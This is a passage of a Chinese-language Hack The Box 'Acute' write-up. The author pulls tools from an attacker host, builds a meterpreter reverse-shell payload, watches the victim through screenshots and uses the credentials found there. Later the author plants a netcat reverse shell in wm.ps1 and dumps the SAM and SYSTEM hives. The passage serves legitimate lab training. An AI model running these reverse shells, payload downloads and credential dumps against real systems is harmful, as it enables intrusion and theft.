class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">1900</span>       *:*                                    <span class="hljs-number">4980</span><br>  UDP    <span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.2</span>:<span class="hljs-number">58360</span>      *:*                                    <span class="hljs-number">4980</span><br>  UDP    [::]:<span class="hljs-number">123</span>               *:*                                    <span class="hljs-number">956</span><br>  UDP    [::]:<span class="hljs-number">500</span>               *:*                                    <span class="hljs-number">436</span><br>  UDP    [::]:<span class="hljs-number">4500</span>              *:*                                    <span class="hljs-number">436</span><br>  UDP    [::]:<span class="hljs-number">5353</span>              *:*                                    <span class="hljs-number">896</span><br>  UDP    [::]:<span class="hljs-number">5353</span>              *:*                                    <span class="hljs-number">1132</span><br>  UDP    [::]:<span class="hljs-number">5355</span>              *:*                                    <span class="hljs-number">1132</span><br>  UDP    [::]:<span class="hljs-number">50837</span>             *:*                                    <span class="hljs-number">1132</span><br>  UDP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">1900</span>             *:*                                    <span class="hljs-number">4980</span><br>  UDP    [::<span class="hljs-number">1</span>]:<span class="hljs-number">58359</span>            *:*                                    <span class="hljs-number">4980</span><br>  UDP    [fe80::<span class="hljs-number">9513</span>:<span class="hljs-number">4361</span>:<span class="hljs-number">23</span>ec:<span class="hljs-number">64f</span>d%<span class="hljs-number">14</span>]:<span class="hljs-number">1900</span>  *:*                                    <span class="hljs-number">4980</span><br>  UDP    [fe80::<span class="hljs-number">9513</span>:<span class="hljs-number">4361</span>:<span class="hljs-number">23</span>ec:<span class="hljs-number">64f</span>d%<span class="hljs-number">14</span>]:<span class="hljs-number">58358</span>  *:*                                    <span class="hljs-number">4980</span><br>PS C:\Utils&gt; <br><br>一般到这个时候，如果是Linux的话，我就该上pspy了，监控整体的所有玩家的进程，看看能发现点啥不了。。<br><br>winPEASx64.exe<br><br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/winPEASx64.exe -o C:\Utils\winPEASx64.exe</span><br><br>PS C:\Utils&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.38/winPEASx64.exe -o C:\Utils\winPEASx64.exe</span><br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/winPEASx64.exe -o C:\Utils\winPEASx64.exe</span><br>PS C:\Utils&gt; <br><br>PS C:\Utils&gt; ./winPEASx64.exe<br>./winPEASx64.exe<br><br>����������͹ RDP Sessions<br>    SessID    pSessionName   pUserName      pDomainName              State     SourceIP<br>    <span class="hljs-number">1</span>         Console        edavies        ACUTE                    Active    <br><br>这里显示当前用户正在RDP的方式登录中<br><br>C:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\<span class="hljs-number">2.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>\passwords.txt<br></code></pre></td></tr></table></figure>
+
+<p>19、发现是一个密码清单，差点把我的UI界面给卡主，既然存在另一个人登录，呢就上MSF进行监控把，这里是根据演练报告看的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=<span class="hljs-number">53</span> -f exe -o shell.exe<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: <span class="hljs-number">200774</span> bytes<br>Final size of exe file: <span class="hljs-number">207360</span> bytes<br>Saved as: shell.exe<br><br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/shell.exe -o C:\Utils\shell.exe</span><br><br>PS C:\Utils&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.38/shell.exe -o C:\Utils\shell.exe</span><br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/shell.exe -o C:\Utils\shell.exe</span><br>PS C:\Utils&gt; ./shell.exe<br>./shell.exe<br>PS C:\Utils&gt; <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span> - - [<span class="hljs-number">17</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">06</span>:<span class="hljs-number">39</span>:<span class="hljs-number">41</span>] <span class="hljs-string">&quot;GET /shell.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ msfconsole<br>msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>payload =&gt; windows/x64/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span><br>LHOST =&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT <span class="hljs-number">53</span><br>LPORT =&gt; <span class="hljs-number">53</span><br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>:<span class="hljs-number">53</span> <br>[*] Sending stage (<span class="hljs-number">200774</span> bytes) to <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span><br>[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>:<span class="hljs-number">53</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span>:<span class="hljs-number">49865</span>) at <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-17</span> <span class="hljs-number">06</span>:<span class="hljs-number">40</span>:<span class="hljs-number">16</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure>
+
+<p>20、开始进行截图</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">meterpreter &gt; bg<br>[*] Backgrounding session <span class="hljs-number">1.</span>..<br>msf6 <span class="hljs-title function_">exploit</span><span class="hljs-params">(multi/handler)</span> &gt; use post/windows/manage/migrate<br>msf6 <span class="hljs-title function_">post</span><span class="hljs-params">(windows/manage/migrate)</span> &gt; <span class="hljs-built_in">set</span> SESSION 1<br>SESSION =&gt; <span class="hljs-number">1</span><br>msf6 <span class="hljs-title function_">post</span><span class="hljs-params">(windows/manage/migrate)</span> &gt; run<br><br>[*] Running module against ACUTE-PC01<br>[*] Current server process: shell.<span class="hljs-title function_">exe</span> <span class="hljs-params">(<span class="hljs-number">5392</span>)</span><br>[*] Spawning notepad.exe process to migrate into<br>[*] Spoofing PPID 0<br>[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.<br>[-] Call <span class="hljs-built_in">stack</span>:<br>[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:176:in `execute&#x27;<br>[-]   /usr/share/metasploit-framework/modules/post/windows/manage/migrate.rb:111:in `create_temp_proc&#x27;<br>[-]   /usr/share/metasploit-framework/modules/post/windows/manage/migrate.rb:64:in `run&#x27;<br>[*] Post module execution completed<br>msf6 <span class="hljs-title function_">post</span><span class="hljs-params">(windows/manage/migrate)</span> &gt; sessions -i 1<br>[*] Starting interaction with 1...<br><br>meterpreter &gt; screenshot<br>Screenshot saved to: /home/kali/Desktop/CYEgRIyy.jpeg<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/14.png" srcset="/img/loading.gif" lazyload></p>
+<p>21、到这里开始不断的截图监控，在截图中，发现了一个密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">meterpreter &gt; screenshot<br>Screenshot saved to: /home/kali/Desktop/LISdMsyZ.jpeg<br>meterpreter &gt; screenshot<br>Screenshot saved to: /home/kali/Desktop/qoiqfcTA.jpeg<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Acute-htb-writeup/15.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">enter-pssession -computername atsserver<br>enter-pssession -computername atsserver<br>$passwd = ConvertTo-SecureString <span class="hljs-string">&quot;w3_4R3_th3_f0rce.&quot;</span> -AsPlainText -Force<br>$cred = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\imonks&quot;</span>,$passwd)<br>Enter-PSSession -ComputerName ATSSERVER -Credential $cred<br>Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br></code></pre></td></tr></table></figure>
+
+<p>22、我们可以以域用户身份在域控制器上执行 PowerShell 命令imonks，而不是以域用户身份启动与域控制器的交互式会话：Invoke-Commandimonks</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; $pass = ConvertTo-SecureString <span class="hljs-string">&quot;W3_4R3_th3_f0rce.&quot;</span> -AsPlainText -Force<br>$pass = ConvertTo-SecureString <span class="hljs-string">&quot;W3_4R3_th3_f0rce.&quot;</span> -AsPlainText -Force<br>PS C:\Utils&gt; $cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\imonks&quot;</span>, $pass)<br>$cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&quot;ACUTE\imonks&quot;</span>, $pass)<br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; whoami &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; whoami &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>acute\imonks<br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<p>23、这足以阅读user.txt：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-Command -ScriptBlock &#123; cat C:\users\imonks\desktop\user.txt &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; cat C:\users\imonks\desktop\user.txt &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; cat C:\users\imonks\desktop\user.txt &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><span class="hljs-number">41</span>ac4e3c46c2ce5c32eaa077827a887f<br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>24、除了 之外user.txt，imonk 的桌面上还有另一个文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; ls ..\desktop &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; ls ..\desktop &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><br><br>    Directory: C:\Users\imonks\desktop<br><br><br>Mode                 LastWriteTime         Length Name                               PSComputerName                    <br>----                 -------------         ------ ----                               --------------                    <br>-ar---        <span class="hljs-number">16</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">13</span>:<span class="hljs-number">33</span>             <span class="hljs-number">34</span> user.txt                           ATSSERVER                         <br>-a----        <span class="hljs-number">11</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>     <span class="hljs-number">18</span>:<span class="hljs-number">04</span>            <span class="hljs-number">602</span> wm.ps1                             ATSSERVER                         <br><br><br>PS C:\Utils&gt; <br><br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; cat ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><br>Invoke-Command -ScriptBlock &#123; cat ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><br>$securepasswd = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br><br>$passwd = $securepasswd | ConvertTo-SecureString<br><br>$creds = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, $passwd)<br><br>Invoke-Command -ScriptBlock &#123;Get-Volume&#125; -ComputerName Acute-PC01 -Credential $creds<br><br>PS C:\Utils&gt; <br><br><br>PS C:\Utils&gt; net localgroup Administrators<br>net localgroup Administrators<br>Alias name     Administrators<br>Comment        Administrators have complete and unrestricted access to the computer/domain<br><br>Members<br><br>-------------------------------------------------------------------------------<br>ACUTE\Domain Admins<br>ACUTE\jmorgan<br>Administrator<br>The command completed successfully.<br><br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<p>25、修改脚本，我可以访问Get-Content( cat) 和Set-Content( sc)，因此我可以相对轻松地创建新脚本。我可以让它r.exe再次调用（因为我在已经打开的同一个盒子上执行），但我不想退出 PowerShell 会话来启动新的侦听器。我将上传nc64.exe并C:\utils让脚本调用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; ((cat ..\desktop\wm.ps1 -Raw) -replace <span class="hljs-string">&#x27;Get-Volume&#x27;</span>, <span class="hljs-string">&#x27;C:\utils\nc.exe -e cmd 10.10.14.38 4444&#x27;</span>) | sc -Path ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; ((cat ..\desktop\wm.ps1 -Raw) -replace <span class="hljs-string">&#x27;Get-Volume&#x27;</span>, <span class="hljs-string">&#x27;C:\utils\nc.exe -e cmd 10.10.14.38 4444&#x27;</span>) | sc -Path ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; cat ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; cat ..\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>$securepasswd = <span class="hljs-string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51&#x27;</span><br>$passwd = $securepasswd | ConvertTo-SecureString<br>$creds = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&quot;acute\jmorgan&quot;</span>, $passwd)<br>Invoke-Command -ScriptBlock &#123;C:\utils\nc.exe -e cmd <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span> <span class="hljs-number">4444</span>&#125; -ComputerName Acute-PC01 -Credential $creds<br><br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; C:\users\imonks\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; C:\users\imonks\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>The term <span class="hljs-string">&#x27;C:\utils\nc.exe&#x27;</span> is not recognized as the name of a cmdlet, function, script file, or operable program. <br>Check the spelling of the name, or <span class="hljs-keyword">if</span> a path was included, verify that the path is correct and try again.<br>    + CategoryInfo          : ObjectNotFound: (C:\utils\nc.exe:String) [], CommandNotFoundException<br>    + FullyQualifiedErrorId : CommandNotFoundException<br>    + PSComputerName        : ATSSERVER<br> <br>PS C:\Utils&gt; ls<br>ls<br><br><br>    Directory: C:\Utils<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----        <span class="hljs-number">16</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">15</span>:<span class="hljs-number">17</span>         <span class="hljs-number">770279</span> PowerView.ps1                                                        <br>-a----        <span class="hljs-number">16</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">15</span>:<span class="hljs-number">49</span>         <span class="hljs-number">207360</span> shell.exe                                                            <br>-a----        <span class="hljs-number">16</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">15</span>:<span class="hljs-number">28</span>        <span class="hljs-number">2387456</span> winPEASx64.exe                                                       <br><br><br>PS C:\Utils&gt; <br></code></pre></td></tr></table></figure>
+
+<p>26、那这里上传一下吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Utils&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.38/nc.exe -o C:\Utils\nc.exe</span><br>iwr -uri http:<span class="hljs-comment">//10.10.14.38/nc.exe -o C:\Utils\nc.exe</span><br>PS C:\Utils&gt; Invoke-Command -ScriptBlock &#123; C:\users\imonks\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br>Invoke-Command -ScriptBlock &#123; C:\users\imonks\desktop\wm.ps1 &#125; -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">4444</span><br>listening on [any] <span class="hljs-number">4444</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.145</span>] <span class="hljs-number">49842</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.19044</span><span class="hljs-number">.1466</span>]<br>(c) Microsoft Corporation. All rights reserved.<br><br>C:\Users\jmorgan\Documents&gt;whoami<br>whoami<br>acute\jmorgan<br><br>C:\Users\jmorgan\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>27、获取密码，转储sam，作为 Acute-PC01 上的本地管理员，jmorgan 可以创建注册表配置单元的备份：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Users\jmorgan\Documents&gt;cd C:/<br>cd C:/<br><br>C:\&gt;ls<br>ls<br><span class="hljs-string">&#x27;ls&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>C:\&gt;powershell<br>powershell<br>Windows PowerShell<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> Microsoft Corporation. All rights reserved.<br><br>Try the new cross-platform PowerShell https:<span class="hljs-comment">//aka.ms/pscore6</span><br><br>PS C:\&gt; ls<br>ls<br><br><br>    Directory: C:\<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>d-----        07/12/2019     09:14                PerfLogs                                                             <br>d-r---        06/12/2021     11:06                Program Files                                                        <br>d-r---        07/12/2021     12:43                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>                                                  <br>d-r---        21/12/2021     22:50                Users                                                                <br>d-----        16/04/2024     15:49                Utils                                                                <br>d-----        16/12/2021     01:23                Windows                                                              <br><br><br>PS C:\&gt; cd Utils<br>cd Utils<br>PS C:\Utils&gt; ls<br>ls<br><br><br>    Directory: C:\Utils<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----        16/04/2024     16:33          68608 nc.exe                                                               <br>-a----        16/04/2024     15:17         770279 PowerView.ps1                                                        <br>-a----        16/04/2024     15:49         207360 shell.exe                                                            <br>-a----        16/04/2024     15:28        2387456 winPEASx64.exe                                                       <br><br><br>PS C:\Utils&gt; <br><br><br><br>reg save HKLM\sam sam.bak<br><br>reg save HKLM\system sys.bak<br><br>PS C:\Utils&gt; reg save HKLM\sam sam.bak<br>reg save HKLM\sam sam.bak<br>The operation completed successfully.<br>PS C:\Utils&gt; reg save HKLM\system sys.bak<br>reg save HKLM\system sys.bak<br>The operation completed successfully.<br>PS C:\Utils&gt; ls<br>ls<br><br><br>    Directory: C:\Utils<br><br><br>Mode                 LastWriteTime         Length Name                                                                 <br>----                 -------------         ------ ----                                                                 <br>-a----        16/04/2024     16:33          68608 nc.exe                                                               <br>-a----        16/04/2024     15:17         770279 PowerView.ps1                                                        <br>-a----        16/04/2024     16:36          57344 sam.bak                                                              <br>-a----        16/04/2024     15:49         207360 shell.exe                                                            <br>-a----        16/04/2024     16:36       12140544 sys.bak                                                              <br>-a----        16/04/2024     15:28        2387456 winPEASx64.exe                                                       <br><br><br>PS C:\Utils&gt; <br><br>然后通过 msf 进行下载<br><br><br>^C<br>Terminate channel 1? [y/N]  <br>^C<br>Terminate channel 1? [y/N]  y<br>meterpreter &gt; download sam.bak<br>[*] Downloading: sam.bak -&gt; /home/kali/Desktop/sam.bak<br>[*] Downloaded 56.00 KiB of 56.00 <span class="hljs-title function_">KiB</span> <span class="hljs-params">(<span class="hljs-number">100.0</span>%)</span>: sam.bak -&gt; /home/kali/Desktop/sam.bak<br>[*] Completed  : sam.bak -&gt; /home/kali/Desktop/sam.bak<br>meterpreter &gt; download sys.bak<br>[*] Downloading: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 1.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span class="hljs-params">(<span class="hljs-number">8.64</span>%)</span>: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact &lt;id&gt; --timeout &lt;value&gt;<br>meterpreter &gt; download sys.bak<br>[*] Downloading: sys.bak -&gt; /home/kali/Desktop/sys.bak<br>[*] Downloaded 1.00 MiB of 11.58 <span class="hljs-title function_">MiB</span> <span 